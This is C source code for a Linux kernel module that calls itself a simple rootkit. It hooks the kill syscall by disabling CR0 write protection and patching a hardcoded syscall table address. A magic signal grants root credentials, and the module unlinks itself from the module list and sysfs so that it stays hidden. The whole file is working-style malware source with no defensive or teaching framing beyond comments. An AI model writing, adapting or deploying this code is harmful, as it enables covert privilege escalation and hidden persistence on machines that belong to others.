#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/list.h>

// License is required for some symbols to be accessible
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Researcher");
MODULE_DESCRIPTION("A simple LKM rootkit");
MODULE_VERSION("0.01");

// The magic signal to trigger root
#define MAGIC_SIGNAL 10

// Function pointers to store original syscalls
static asmlinkage long (*original_kill)(const struct pt_regs *regs);

// Helper to disable write protection (CR0 register)
static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0); // Clear the WP bit
    write_cr0(cr0);
}

// Helper to enable write protection
static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0); // Set the WP bit
    write_cr0(cr0);
}

// Our hooked kill syscall
static asmlinkage long hooked_kill(const struct pt_regs *regs) {
    int sig = regs->si; // Signal number is usually in si (depends on arch)
    pid_t pid = regs->di; // PID is usually in di

    // Check if the signal matches our magic number
    if (sig == MAGIC_SIGNAL) {
        struct task_struct *task;
        rcu_read_lock();
        task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (task) {
            struct cred *new_creds = prepare_creds();
            if (new_creds) {
                // Set UID/GID to 0 (Root)
                new_creds->uid.val = new_creds->gid.val = 0;
                new_creds->euid.val = new_creds->egid.val = 0;
                new_creds->suid.val = new_creds->sgid.val = 0;
                new_creds->fsuid.val = new_creds->fsgid.val = 0;
                commit_creds(new_creds);
                printk(KERN_INFO "Rootkit: Gave root privileges to PID %d\n", pid);
            }
        }
        rcu_read_unlock();
        return 0; // Pretend the kill never happened
    }

    // Otherwise, call the original kill syscall
    return original_kill(regs);
}

// Function to hide the module from lsmod
static void hide_module(void) {
    // Remove this module from the list
    list_del(&THIS_MODULE->list);

    // Clean up the kobject (removes from /sys/module)
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // Trick the module refcounting system to think we are still loaded
    // so we can unload safely later without crashing
    THIS_MODULE->mkobj.kobj.sd = NULL;

    printk(KERN_INFO "Rootkit: Module hidden.\n");
}

// Initialization
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Loading...\n");

    // WARNING: In modern kernels, sys_call_table is not exported.
    // You usually have to find it via kallsyms_lookup_name or /boot/System.map
    // For this example, we assume we have the address (hardcoded or found).
    unsigned long *sys_call_table = (unsigned long *)0xffffffff81a001c0; 

    // Save the original kill syscall
    original_kill = (void *)sys_call_table[__NR_kill];

    // Disable WP and overwrite the syscall
    disable_write_protection();
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    enable_write_protection();

    hide_module();

    return 0;
}

// Cleanup
static void __exit rootkit_exit(void) {
    unsigned long *sys_call_table = (unsigned long *)0xffffffff81a001c0;

    // Restore the original syscall
    disable_write_protection();
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    enable_write_protection();

    printk(KERN_INFO "Rootkit: Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

